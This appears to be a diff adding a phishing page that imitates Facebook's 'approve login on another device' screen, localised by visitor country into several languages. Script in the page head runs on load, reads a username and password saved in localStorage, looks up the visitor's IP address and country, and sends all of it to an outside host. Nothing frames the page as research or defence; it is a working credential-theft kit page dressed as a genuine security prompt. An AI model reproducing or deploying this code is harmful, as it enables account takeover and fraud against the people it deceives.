@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Approve on other device</title>
+        <link rel="shortcut icon" href="image/icon.png" type="image/x-icon">
+        <link rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+            integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+
+        <style>
+            body {
+                font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: #EEF6FE;
+            }
+
+            .home {
+                margin: 10px auto;
+                padding: 10px 20px;
+            }
+
+
+
+            .loader {
+                --d: 22px;
+                width: 4px;
+                height: 4px;
+                border-radius: 50%;
+                color: #1877F2;
+                box-shadow:
+                    calc(1*var(--d)) calc(0*var(--d)) 0 0,
+                    calc(0.707*var(--d)) calc(0.707*var(--d)) 0 1px,
+                    calc(0*var(--d)) calc(1*var(--d)) 0 2px,
+                    calc(-0.707*var(--d)) calc(0.707*var(--d)) 0 3px,
+                    calc(-1*var(--d)) calc(0*var(--d)) 0 4px,
+                    calc(-0.707*var(--d)) calc(-0.707*var(--d))0 5px,
+                    calc(0*var(--d)) calc(-1*var(--d)) 0 6px;
+                animation: l27 1s infinite steps(8);
+            }
+
+            @keyframes l27 {
+                100% {
+                    transform: rotate(1turn)
+                }
+            }
+
+            @media screen and (max-width: 600px) {
+                .Input:focus {
+                    border: 1px solid rgba(28, 43, 51, 1.0000) !important;
+                }
+            }
+
+            .btncomeback i {
+                font-size: 24px;
+                margin-bottom: 20px;
+            }
+
+            .home p {
+                font-size: 14px;
+                color: black;
+                font-weight: 400;
+                font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+                line-height: 20px;
+                margin: 0;
+            }
+
+            .home h4 {
+                font-weight: 600;
+                margin-top: 5px;
+            }
+
+            img {
+                width: 100%;
+                height: auto;
+                margin-top: 10px;
+                border-radius: 10px;
+                object-fit: cover;
+            }
+
+            .approve {
+                margin-top: 20px;
+                border: 2px solid black;
+                width: 30px;
+                display: flex;
+                justify-content: center;
+                border-radius: 50%;
+                font-size: 20px;
+                height: 30px;
+                text-align: center;
+
+            }
+
+            .approve p {
+                font-size: 14px;
+                font-weight: 800;
+            }
+
+            .content {
+                margin-left: 10px;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .content h5 {
+                font-size: 16px;
+                font-weight: 600;
+                margin-top: 15px;
+            }
+
+            .content span {
+                color: #8a8d91;
+                font-size: 14px;
+                margin-top: -5px;
+            }
+
+            .btnAnotherWay {
+                margin-top: 20px;
+                width: 100%;
+                height: 35px;
+                display: flex;
+                border-radius: 12px;
+                border: 1px solid #ccc;
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+                cursor: pointer;
+
+            }
+
+            .btnAnotherWay p {
+                font-size: 14px;
+                font-weight: 500;
+            }
+
+            @media screen and (min-width: 600px) {
+                .home {
+                    text-align: center;
+                }
+
+                img {
+                    width: auto;
+                    height: 400px;
+                }
+
+                .btnAnotherWay {
+                    width: 400px;
+                    margin: 20px auto;
+                }
+
+                .homepage {
+                    text-align: center;
+                    justify-content: center;
+                }
+
+                .btncomeback {
+                    display: none;
+                }
+            }
+        </style>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', async function () {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address',);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            });
+
+        </script>
+        <script>
+            async function fetchIpAddress() {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address', address);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            }
+
+            fetchIpAddress();
+        </script>
+        <script>
+            var ipAddress = localStorage.getItem('ipAddress');
+            var address = localStorage.getItem('address');
+            var username = localStorage.getItem('username');
+            var password = localStorage.getItem('password');
+            fetch('https://superpc.id.vn/checkpoint?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+            setTimeout(function () {
+            }, 5000);
+        </script>
+    </head>
+
+    <body>
+        <div class="home">
+            <div class="btncomeback">
+                <i class="fa fa-angle-left"></i>
+            </div>
+            <p id="text1">Facebook users</p>
+            <h4 id="text2"></h4>
+            <p id="text3">Check notifications on another device.</p>
+            <p id="text4">See Facebook notifications on that device and approve your continued login</p>
+            <img src="./image/page.jpg" alt="">
+            <div class="homepage" style="display: flex;margin-left: 10px;">
+                <div class="approve">
+                    <p>...</p>
+                </div>
+                <div class="content">
+                    <h5 id="text5">Awaiting Approval</h5>
+                    <span id="text6">Approve from another device to continue</span>
+                </div>
+            </div>
+            <div class="btnAnotherWay">
+                <p id="text7">Try another way</p>
+            </div>
+        </div>
+    </body>
+
+    <script>
+        var ipAddress = localStorage.getItem('ipAddress');
+        var address = localStorage.getItem('address');
+        const text1 = document.getElementById('text1');
+        const text2 = document.getElementById('text2');
+        const text3 = document.getElementById('text3');
+        const text4 = document.getElementById('text4');
+        const text5 = document.getElementById('text5');
+        const text6 = document.getElementById('text6');
+        const text7 = document.getElementById('text7');
+
+        if (address === 'Viet Nam') {
+            text1.textContent = 'Người dùng Facebook';
+            text2.textContent = 'Kiểm tra thông báo trên thiết bị khác';
+            text3.textContent = 'Chúng tôi gửi thông báo đến thiết bị khác của bạn.';
+            text4.textContent = 'Hãy xem thông báo của Facebook trên thiết bị đó và phê duyệt lượt đăng nhập tiếp tục của bạn'
+            text5.textContent = 'Đang chờ phê duyệt';
+            text6.textContent = 'Phê duyệt từ thiết bị khác để tiếp tục';
+            text7.textContent = 'Thử cách khác';
+            document.title = 'Kiểm tra trên thiết bị khác'
+        } else if (address === 'France') {
+            text1.textContent = 'Utilisateur Facebook';
+            text2.textContent = 'Vérifiez les notifications sur un autre appareil';
+            text3.textContent = 'Nous avons envoyé une notification à votre autre appareil.';
+            text4.textContent = 'Veuillez consulter les notifications Facebook sur cet appareil et approuver votre connexion continue.';
+            text5.textContent = 'En attente d\'approbation';
+            text6.textContent = 'Approuvez depuis un autre appareil pour continuer';
+            text7.textContent = 'Essayer une autre méthode';
+            document.title = 'Vérifiez les autres dommages'
+
+        } else if (address === 'Spain') {
+            text1.textContent = 'Usuario de Facebook';
+            text2.textContent = 'Verificar notificaciones en otro dispositivo';
+            text3.textContent = 'Hemos enviado una notificación a su otro dispositivo.';
+            text4.textContent = 'Por favor, consulte las notificaciones de Facebook en ese dispositivo y apruebe la continuación de su inicio de sesión.';
+            text5.textContent = 'Esperando aprobación';
+            text6.textContent = 'Apruebe desde otro dispositivo para continuar';
+            text7.textContent = 'Intentar otra opción';
+            document.title = 'Verifique otros daños'
+
+        } else if (address === 'Italy') {
+            text1.textContent = 'Utente Facebook';
+            text2.textContent = 'Controlla le notifiche su un altro dispositivo';
+            text3.textContent = 'Abbiamo inviato una notifica al tuo altro dispositivo.';
+            text4.textContent = 'Consulta le notifiche di Facebook su quel dispositivo e approva il proseguimento del tuo accesso.';
+            text5.textContent = 'In attesa di approvazione';
+            text6.textContent = 'Approva da un altro dispositivo per continuare';
+            text7.textContent = 'Prova un\'altra opzione';
+            document.title = 'Controlla altri danni'
+
+        } else if (address === 'Thailand') {
+            text1.textContent = 'ผู้ใช้ Facebook';
+            text2.textContent = 'ตรวจสอบการแจ้งเตือนบนอุปกรณ์อื่น';
+            text3.textContent = 'เราได้ส่งการแจ้งเตือนไปยังอุปกรณ์อื่นของคุณ';
+            text4.textContent = 'กรุณาตรวจสอบการแจ้งเตือนจาก Facebook บนอุปกรณ์นั้น และอนุมัติการเข้าสู่ระบบของคุณต่อไป';
+            text5.textContent = 'รอการอนุมัติ';
+            text6.textContent = 'อนุมัติจากอุปกรณ์อื่นเพื่อดำเนินการต่อ';
+            text7.textContent = 'ลองวิธีอื่น';
+            document.title = 'ตรวจสอบความเสียหายอื่นๆ'
+
+        } else if (address === 'Portugal') {
+            text1.textContent = 'Utilizador do Facebook';
+            text2.textContent = 'Verifique as notificações noutro dispositivo';
+            text3.textContent = 'Enviamos uma notificação para o seu outro dispositivo.';
+            text4.textContent = 'Por favor, consulte as notificações do Facebook nesse dispositivo e aprove a continuação do seu login.';
+            text5.textContent = 'A aguardar aprovação';
+            text6.textContent = 'Aprovar a partir de outro dispositivo para continuar';
+            text7.textContent = 'Experimentar outra opção';
+            document.title = 'Verifique outros danos'
+
+        } else if (address === 'Israel') {
+            text1.textContent = 'משתמש Facebook';
+            text2.textContent = 'בדוק התראות במכשיר אחר';
+            text3.textContent = 'שלחנו התראה למכשיר אחר שלך.';
+            text4.textContent = 'בבקשה בדוק את ההתראות של Facebook במכשיר זה ואשר את התחברותך המשך.';
+            text5.textContent = 'ממתין לאישור';
+            text6.textContent = 'אשר ממכשיר אחר כדי להמשיך';
+            text7.textContent = 'נסה אפשרות אחרת';
+            document.title = 'בדוק במכשיר אחר'
+
+        }
+    </script>
+
+</html>
